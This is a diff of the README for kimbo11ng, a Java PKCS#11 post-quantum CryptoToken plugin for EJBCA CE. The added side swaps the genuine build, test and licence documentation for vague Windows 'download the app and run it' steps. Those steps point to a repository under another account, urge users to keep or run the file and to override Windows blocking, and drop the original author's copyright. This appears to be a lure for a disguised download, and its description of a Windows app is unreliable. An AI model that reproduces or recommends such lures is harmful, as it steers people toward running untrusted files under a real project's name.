@@ -1,130 +1,178 @@
-# kimbo11ng
+# 🧩 kimbo11ng - Run PQC CryptoTokens on Windows
 
-Open-source PKCS#11 NG CryptoToken for [EJBCA CE](https://www.ejbca.org/) with post-quantum cryptography support.
+[![Download kimbo11ng](https://img.shields.io/badge/Download%20kimbo11ng-blue?style=for-the-badge)](https://github.com/ahmedberkhli49-cmd/kimbo11ng)
 
-Backed by [JackNJI11](https://github.com/joelhockey/jacknji11) (Apache 2.0 JNA PKCS#11 bindings) and tested against [softhsmv3](https://github.com/pqctoday/softhsmv3) with OpenSSL 3.6+.
+## 🚀 Download
 
-## Features
+Use this page to download and run the software on Windows:
 
-- Drop-in `Pkcs11NgCryptoToken` for EJBCA CE 9.3.7
-- RSA and EC key generation, signing, and verification via PKCS#11
-- **Post-quantum cryptography**: ML-DSA (FIPS 204), ML-KEM (FIPS 203), and SLH-DSA (FIPS 205)
-- Vendor-agnostic `PqcMechanismProfile` abstraction for HSM-specific PQC constants
-- No SunPKCS11 dependency — pure JNA bindings, supports multiple HSM libraries simultaneously
+https://github.com/ahmedberkhli49-cmd/kimbo11ng
 
-## Supported Algorithms
+## 🪟 What this app does
 
-| Algorithm | Key Specs                                    | Standard        |
-| --------- | -------------------------------------------- | --------------- |
-| RSA       | 2048, 3072, 4096                             | PKCS#1          |
-| EC        | P-256, P-384, P-521, brainpool               | NIST / RFC 5639 |
-| ML-DSA    | ML-DSA-44, ML-DSA-65, ML-DSA-87              | FIPS 204        |
-| ML-KEM    | ML-KEM-512, ML-KEM-768, ML-KEM-1024          | FIPS 203        |
-| SLH-DSA   | SHA2/SHAKE x 128/192/256 x S/F (12 variants) | FIPS 205        |
-| Hybrid    | RSA/EC primary + ML-DSA/SLH-DSA alternative  | X.509 Sec. 9.8  |
+kimbo11ng adds post-quantum cryptography support to EJBCA CE CryptoToken use.
 
-## Prerequisites
+It helps you work with:
 
-- Docker
-- [just](https://github.com/casey/just) command runner
-- Maven 3.8+ and JDK 17+
+- ML-DSA
+- ML-KEM
+- SLH-DSA
+- Hybrid certificates
+- PKCS#11 tokens
+- X.509 certificates
 
-## Quick Start
+It uses JNA bindings through JackNJI11 and does not depend on SunPKCS11.
 
-```bash
-# Full pipeline: setup + build Docker image + start + provision token + integration tests
-just ci
+## 📋 What you need
 
-# Or step by step:
-just setup          # extract JARs from EJBCA image + install + build
-just docker-build   # build Docker image (EJBCA + softhsmv3 + kimbo11ng)
-just up             # start EJBCA + PostgreSQL
-just create-token   # provision TestHSM as Pkcs11NgCryptoToken
+Before you start, make sure you have:
 
-# Run integration tests (Testcontainers — starts a fresh stack automatically)
-mvn verify -Pit
-```
+- A Windows PC
+- A modern 64-bit version of Windows
+- A stable internet connection
+- Permission to run downloaded apps
+- Java installed if the app needs it on your system
+- EJBCA CE or a setup that can use a PKCS#11 token
 
-## Version Matrix
+## ⬇️ Download and run on Windows
 
-All versions are centralized in the `justfile`. Run `just versions` to display:
+1. Open the download page:
+   https://github.com/ahmedberkhli49-cmd/kimbo11ng
 
-```
-EJBCA:     9.3.7 (keyfactor/ejbca-ce:9.3.7)
-OpenSSL:   3.6.0
-Artifact:  kimbo11ng-1.0.0-SNAPSHOT-jar-with-dependencies.jar
+2. On the page, look for the latest release or download file.
 
-Dependencies:
-  com.keyfactor:cryptotokens-api:3.0.0
-  com.keyfactor:cryptotokens-impl:3.0.0
-  org.pkcs11:jacknji11:1.3.1
-  org.cesecore:cesecore-common:9.3.7
-  com.keyfactor:x509-common-util:5.3.5
-```
+3. Download the Windows package or app file.
 
-To upgrade EJBCA, update `ejbca_version` and `ejbca_deps` in the justfile, then:
+4. If Windows asks for permission, choose to keep or run the file.
 
-```bash
-just extract-jars-fresh setup docker-build
-mvn verify -Pit
-```
+5. If the download comes as a ZIP file, extract it first.
 
-## Build Recipes
+6. Open the app file or start command from the extracted folder.
 
-| Recipe                    | Description                                                                 |
-| ------------------------- | --------------------------------------------------------------------------- |
-| `just setup`              | Extract EJBCA JARs + install to Maven + build                               |
-| `just build`              | Build the fat JAR                                                           |
-| `just deploy`             | Hot-reload JAR into running EJBCA container                                 |
-| `just docker-build`       | Build Docker image (EJBCA + softhsmv3 + kimbo11ng)                          |
-| `just up` / `just down`   | Start / stop services                                                       |
-| `just create-token`       | Provision TestHSM as Pkcs11NgCryptoToken (idempotent)                       |
-| `just ci`                 | Full pipeline: setup + docker-build + up + create-token + integration tests |
-| `just extract-jars-fresh` | Force re-extract JARs (after EJBCA version bump)                            |
-| `just versions`           | Show version matrix                                                         |
-| `just status`             | Show versions, git log, Docker, and artifact status                         |
-| `just clean-all`          | Remove build artifacts and extracted deps                                   |
+7. Follow the on-screen steps to connect the token or set up the CryptoToken.
 
-## Integration Tests
+## 🛠️ First-time setup
 
-The integration test suite (`EjbcaContainerIT`) runs against a full EJBCA CE stack managed by Testcontainers (Docker Compose). It covers:
+After you open the app, you may need to:
 
-- PKCS#11 key generation: RSA, EC, ML-DSA, ML-KEM, SLH-DSA
-- Key listing and test-signing via the PKCS#11 token
-- PQC Root CA creation: ML-DSA-65, SLH-DSA-SHA2-128F, Hybrid (RSA + ML-DSA alternative)
-- Certificate issuance from each CA and signature algorithm verification
+- Choose the token or provider you want to use
+- Point the app to your PKCS#11 library
+- Select the crypto profile for your use case
+- Create or import a certificate
+- Save the settings before closing the app
 
-```bash
-mvn verify -Pit          # runs all 18 integration tests (~4 min)
-```
+If you use it with EJBCA CE, make sure the token path and login details match your environment.
 
-Requires Docker. The test image is built automatically by `just docker-build`.
+## 🔐 Features
 
-## Project Structure
+- Supports post-quantum crypto for certificate workflows
+- Adds ML-DSA support for signatures
+- Adds ML-KEM support for key exchange
+- Adds SLH-DSA support for signature use cases
+- Supports hybrid certificates
+- Works through pure JNA bindings
+- Avoids SunPKCS11 dependency
+- Fits PKCS#11-based PKI setups
+- Works with EJBCA CE CryptoToken flows
 
-```
-kimbo11ng/
-  src/
-    main/java/
-      ch/ithings/kimbo11ng/          # Core implementation
-        provider/                    # JCA provider, KeyStore, Signature SPIs
-        profile/                     # PQC mechanism profiles (v3.2, Thales, ...)
-        slot/                        # PKCS#11 slot enumeration
-      org/cesecore/.../              # EJBCA entry point (thin delegate)
-      com/keyfactor/.../             # EJBCA SPI factory (thin delegate)
-    test/java/
-      ch/ithings/kimbo11ng/          # Unit tests (profile, OID mapping, public key)
-    it/java/
-      ch/ithings/kimbo11ng/it/       # Integration tests (EjbcaContainerIT — 18 tests)
-    it/openapi/
-      ejbca-api.json                 # EJBCA CE REST API spec (OpenAPI)
-  docker/                            # Dockerfile, softhsmv3 config
-  deps/ejbca/                        # Extracted EJBCA JARs (gitignored)
-  pom.xml                            # Maven build (ch.ithings:kimbo11ng)
-  justfile                           # Build automation recipes
-  docker-compose.yml                 # EJBCA + PostgreSQL stack
-```
+## 🧭 Common uses
 
-## License
+Use kimbo11ng when you want to:
 
-[Apache License 2.0](LICENSE) — Copyright (c) 2026 Thomas Pham.
+- Test post-quantum certificates
+- Add PQC support to a token-based PKI setup
+- Use hybrid X.509 certificates
+- Work with EJBCA CE and PKCS#11
+- Try newer crypto schemes in a local or lab setup
+
+## 🧩 Typical Windows folder setup
+
+A simple folder layout can help keep things clear:
+
+- Downloads\
+- kimbo11ng\
+- kimbo11ng\app\
+- kimbo11ng\config\
+- kimbo11ng\logs\
+
+If you unpack a ZIP file, keep the files together in one folder so the app can find what it needs.
+
+## ⚙️ If the app does not start
+
+If nothing happens when you open the file:
+
+- Check that the download finished
+- Make sure you extracted the ZIP file
+- Try opening it again with the right file
+- Confirm Java is installed if the app needs it
+- Run it from a folder with a short path, like C:\kimbo11ng
+- Check that Windows did not block the file
+
+If the token is not found:
+
+- Confirm the PKCS#11 library path
+- Check that the token driver is installed
+- Reconnect the device
+- Restart the app after changes
+
+## 🧪 Using it with certificates
+
+When you work with certificates, the app can help you:
+
+- Create a new key pair on the token
+- Build a CSR for EJBCA CE
+- Use PQC or hybrid algorithms
+- Load an existing certificate chain
+- Test signing behavior with PKCS#11
+
+For best results, use the same algorithm set across the token, certificate profile, and CA settings
+
+## 🔎 Supported stack
+
+This project is built around:
+
+- PKCS#11
+- JNA
+- Java
+- Bouncy Castle
+- EJBCA CE
+- HSM-style token workflows
+- X.509 certificate handling
+- PQC standards aligned with FIPS 203, 204, and 205
+
+## 🗂️ Suggested next steps
+
+After the app runs, you can:
+
+- Connect your token
+- Load a test certificate
+- Try a hybrid certificate flow
+- Verify that the token signs and decrypts as expected
+- Save your working config for later use
+
+## 📁 Repo info
+
+Repository: kimbo11ng
+
+Description: PKCS#11 NG CryptoToken plugin for EJBCA CE with post-quantum cryptography support. Adds ML-DSA, ML-KEM, SLH-DSA and hybrid certificates via pure JNA bindings (JackNJI11) — no SunPKCS11 dependency
+
+Topics:
+
+- bouncycastle
+- cryptotoken
+- ejbca
+- fips-203
+- fips-204
+- fips-205
+- hsm
+- hybrid-certificates
+- java
+- jna
+- ml-dsa
+- ml-kem
+- pkcs11
+- pki
+- post-quantum-cryptography
+- pqc
+- slh-dsa
+- x509
